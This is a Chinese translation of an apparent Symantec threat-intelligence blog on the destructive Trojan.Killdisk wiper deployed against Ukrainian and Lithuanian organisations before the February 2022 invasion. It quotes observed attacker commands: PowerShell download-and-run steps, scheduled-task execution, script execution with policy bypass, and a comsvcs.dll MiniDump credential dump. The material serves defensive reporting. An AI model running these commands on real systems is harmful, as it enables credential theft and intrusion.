## 在入侵前的几个小时内，针对乌克兰和该地区其他国家的目标部署了破坏性恶意软

## 件。

  
2022 年 2 月 24 日 13:42更新：此博客已更新，详细介绍了勒索软件在某些擦除器攻击中被用作可能的诱饵的详细信息。  
2022 年 2 月 25 日 17:00更新：此博客已更新，详细介绍了如何在至少一次攻击中利用已知的 Microsoft SQL Server 漏洞 ( CVE-2021-1636 )。  
在今天早上（2 月 24 日）俄罗斯入侵之前不久，一种新形式的磁盘擦除恶意软件 (Trojan.Killdisk) 被用来攻击乌克兰的组织。Broadcom Software的一个部门赛门铁克也发现了针对立陶宛机器的擦除器攻击的证据。目标部门包括金融、国防、航空和 IT 服务部门的组织。  
Trojan.Killdisk 以可执行文件的形式出现，由 Hermetica Digital Ltd 颁发的证书签名。它包含 32 位和 64 位驱动程序文件，这些文件由存储在其资源部分的 Lempel-Ziv 算法压缩。驱动程序文件由颁发给 EaseUS Partition Master 的证书签名。恶意软件会根据受感染系统的操作系统（OS）版本丢弃相应的文件。驱动文件名是使用wiper的进程ID生成的。  
一旦运行，擦除器将损坏受感染计算机的主引导记录 (MBR)，使其无法运行。除了破坏能力之外，雨刷器似乎没有任何附加功能。

## 攻击链

初步迹象表明，袭击可能已经准备了一段时间。时间证据表明，最早从 2021 年 11 月开始的潜在相关恶意活动。但是，我们将继续审查和验证调查结果。  
在针对乌克兰一个组织的攻击中，攻击者似乎已于 2021 年 12 月 23 日通过针对 Microsoft Exchange Server 的恶意 SMB 活动获得了对网络的访问权限。紧随其后的是凭证盗窃。在 2 月 23 日部署擦除器之前，还于 1 月 16 日安装了一个 web shell。  
至少从 2021 年 11 月 12 日起，立陶宛的一个组织遭到入侵。看来攻击者可能利用 Tomcat 漏洞来执行 PowerShell 命令。解码后的 PowerShell 用于从受害者网络上的内部服务器下载 JPEG 文件。

*   cmd.exe /Q /c powershell -c "(New-Object System.Net.WebClient).DownloadFile('hxxp://192.168.3.13/email.jpeg','CSIDL\_SYSTEM\_DRIVE\\temp\\sys.tmp1')" 1 > \\\\127.0.0.1\\ADMIN$\\\_\_1636727589.6007507 2>&1

一分钟后，攻击者创建了一个计划任务来执行可疑的“postgresql.exe”文件，每周三，特别是当地时间 11:05。然后攻击者运行这个计划任务来执行任务。

*   cmd.exe /Q /c move CSIDL\_SYSTEM\_DRIVE\\temp\\sys.tmp1 CSIDL\_WINDOWS\\policydefinitions\\postgresql.exe 1> \\\\127.0.0.1\\ADMIN$\\\_\_1636727589.6007507 2>&1
*   schtasks /run /tn "\\Microsoft\\Windows\\termsrv\\licensing\\TlsAccess"

九分钟后，攻击者修改了计划任务，改为在当地时间 09:30 执行相同的 postgres.exe 文件。  
从 2 月 22 日开始，赛门铁克观察到文件“postgresql.exe”被执行并用于执行以下操作：

*   执行 certutil 检查与 trustsecpro\[.\]com 和 whatismyip\[.\]com 的连接
*   执行 PowerShell 命令从受感染的 Web 服务器下载另一个 JPEG 文件 - confluence\[.\]novus\[.\]ua

在此活动之后，PowerShell 被用于从受感染的机器中转储凭据：

*   cmd.exe /Q /c powershell -c "rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump 600 C:\\asm\\appdata\\local\\microsoft\\windows\\winupd.log full" 1> \\\\127.0.0.1\\管理员$\\\_\_1638457529.1247072 2>&1

后来，在上述活动之后，执行了几个未知的 PowerShell 脚本。

*   powershell -v 2 -exec 绕过 -File text.ps1
*   powershell -exec 绕过 gp.ps1
*   powershell -exec 绕过 -File link.ps1

五分钟后，wiper (Trojan.KillDisk) 被部署。

## SQL Server 漏洞利用

攻击者似乎利用 Microsoft SQL Server ( CVE-2021-1636 ) 中的一个已知漏洞来破坏至少一个目标组织。在针对乌克兰某组织的攻击中，使用以下进程沿袭于 2021 年 11 月 11 日执行“whoami”命令：

*   CSIDL\_SYSTEM\_DRIVE\\program files\\microsoft sql server\\mssql12.mssqlserver\\mssql\\binn\\sqlservr.exe,CSIDL\_SYSTEM\\services.exe,CSIDL\_SYSTEM\\wininit.exe

第二天，相同的进程沿袭负责执行以下 PowerShell 命令：

*   (New-Object System.Net.WebClient).DownloadFile('hxxp://\[INTERNAL\_HOST\]/label.ico','C:\\temp\\sys.tmp1')

该组织正在运行未打补丁的 Microsoft SQL Server 版本。

## **勒索软件诱饵**

在赛门铁克迄今为止调查的几起攻击中，勒索软件也与擦除器同时部署在受影响的组织中。与擦除器一样，计划任务用于部署勒索软件。勒索软件使用的文件名包括 client.exe、cdir.exe、cname.exe、connh.exe 和 intpub.exe。勒索软件似乎被用作诱饵或分散擦除器攻击的注意力。这与早期针对乌克兰的 WhisperGate 擦除器攻击有一些相似之处，其中擦除器被伪装成勒索软件。
